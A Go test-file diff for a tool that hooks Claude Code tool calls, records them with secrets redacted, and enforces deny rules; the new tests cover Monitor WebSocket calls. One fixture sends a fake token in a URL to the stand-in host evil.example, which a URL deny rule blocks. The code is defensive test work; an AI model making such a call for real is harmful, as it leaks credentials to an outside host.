@@ -5,6 +5,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/tektonsoftware/sigdek/internal/rules"
 )
 
 // denied reports whether a Claude Code PreToolUse answer refuses the call.
@@ -75,30 +77,77 @@ func TestCommandToolsRedact(t *testing.T) {
 }
 
 // What stays as it was: MCP tools stay MCP even with a command input; a tool whose command
-// isn't a string, or that has none (Monitor watching something else), stays "other".
+// isn't a string, or that has none, stays "other". A Monitor call that watches a WebSocket is a
+// web action with its URL (TestMonitorWebSocketIsAWebAction).
 func TestToolsThatArentShell(t *testing.T) {
 	dir := repo(t)
 	cases := []struct {
 		tool  string
 		input map[string]any
 		kind  string
+		url   string
 	}{
-		{"mcp__runner__exec", map[string]any{"command": "npx prisma db push --env=production"}, "mcp"},
-		{"SomeFutureTool", map[string]any{"command": []string{"ls", "--env=production"}}, "other"},
-		{"SomeFutureTool", map[string]any{"cmd": "ls --env=production"}, "other"},
-		{"Monitor", map[string]any{"ws": "ws://localhost:9000/events", "description": "watch"}, "other"},
-		{"ToolSearch", map[string]any{"query": "select:Monitor"}, "other"},
-		{"Agent", map[string]any{"prompt": "run --env=production", "description": "d"}, "other"},
+		{"mcp__runner__exec", map[string]any{"command": "npx prisma db push --env=production"}, "mcp", ""},
+		{"SomeFutureTool", map[string]any{"command": []string{"ls", "--env=production"}}, "other", ""},
+		{"SomeFutureTool", map[string]any{"cmd": "ls --env=production"}, "other", ""},
+		{"Monitor", map[string]any{"ws": "ws://localhost:9000/events", "description": "watch"}, "web", "ws://localhost:9000/events"},
+		{"Monitor", map[string]any{"ws": 9000, "description": "watch"}, "other", ""},
+		{"Monitor", map[string]any{"description": "watch"}, "other", ""},
+		{"ToolSearch", map[string]any{"query": "select:Monitor"}, "other", ""},
+		{"Agent", map[string]any{"prompt": "run --env=production", "description": "d"}, "other", ""},
+		{"Agent", map[string]any{"ws": "wss://evil.example/x", "description": "d"}, "other", ""},
 	}
 	for _, c := range cases {
 		res := ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": c.tool, "tool_input": c.input}), ctx())
 		sealed(t, res.Record)
-		if a := res.Record.Action; a.Kind != c.kind || a.Command != "" {
+		if a := res.Record.Action; a.Kind != c.kind || a.Command != "" || a.URL != c.url {
 			t.Errorf("%s %v: %+v", c.tool, c.input, a)
 		}
 		if pre := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": c.tool, "tool_input": c.input}), ctx()); pre.Stdout != nil {
 			t.Errorf("%s %v: refused: %s", c.tool, c.input, pre.Stdout)
 		}
+	}
+}
+
+// QA2-L5-2: Claude Code's Monitor tool also watches a WebSocket, given as "ws" with no
+// command. That call is a web action with that URL: a URL Block rule stops it, with or without
+// a kind, and the record keeps the URL with its secrets cleaned.
+func TestMonitorWebSocketIsAWebAction(t *testing.T) {
+	dir := repo(t)
+	secret := "ghp_" + strings.Repeat("Ws7", 12)
+	ws := "wss://bot:" + secret + "@evil.example/x?token=" + secret
+	in := map[string]any{"ws": ws, "description": "d", "timeout_ms": 5000}
+	for _, rule := range []rules.Rule{
+		{ID: "no-evil", Effect: rules.Deny, Kinds: []string{"web"}, URL: "*evil.example*"},
+		{ID: "no-evil", Effect: rules.Deny, URL: "*evil.example*"},
+	} {
+		c := ctx()
+		c.Rules.Rules = append(c.Rules.Rules, rule)
+		res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": "Monitor", "tool_input": in}), c)
+		if !denied(t, res) {
+			t.Fatalf("kinds %v: a URL Block rule didn't refuse it: %+v", rule.Kinds, res)
+		}
+		line := sealed(t, res.Record)
+		a := res.Record.Action
+		if res.Record.Outcome != "denied_by_rule" || res.Record.Rule != "no-evil" || a.Kind != "web" || a.Name != "Monitor" ||
+			!strings.HasPrefix(a.URL, "wss://evil.example/x?token=") || strings.Contains(string(line), secret) || res.Record.Redactions < 2 {
+			t.Errorf("kinds %v: %s", rule.Kinds, line)
+		}
+	}
+	// Allowed, it is recorded once it has run, with the same cleaned URL.
+	ran := ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": "Monitor", "tool_input": in}), ctx())
+	line := sealed(t, ran.Record)
+	if a := ran.Record.Action; a.Kind != "web" || !strings.HasPrefix(a.URL, "wss://evil.example/x?token=") || strings.Contains(string(line), secret) {
+		t.Errorf("finished record: %s", line)
+	}
+	// A URL rule leaves a Monitor command alone, and a command rule a WebSocket.
+	c := ctx()
+	c.Rules.Rules = append(c.Rules.Rules, rules.Rule{ID: "no-evil", Effect: rules.Deny, URL: "*evil.example*"})
+	if res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": "Monitor", "tool_input": map[string]any{"command": "tail -f evil.example.log"}}), c); res.Stdout != nil {
+		t.Errorf("a URL rule refused a command: %s", res.Stdout)
+	}
+	if res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": "Monitor", "tool_input": map[string]any{"ws": "wss://api.example/--env=production"}}), ctx()); res.Stdout != nil {
+		t.Errorf("a command rule refused a WebSocket: %s", res.Stdout)
 	}
 }
 
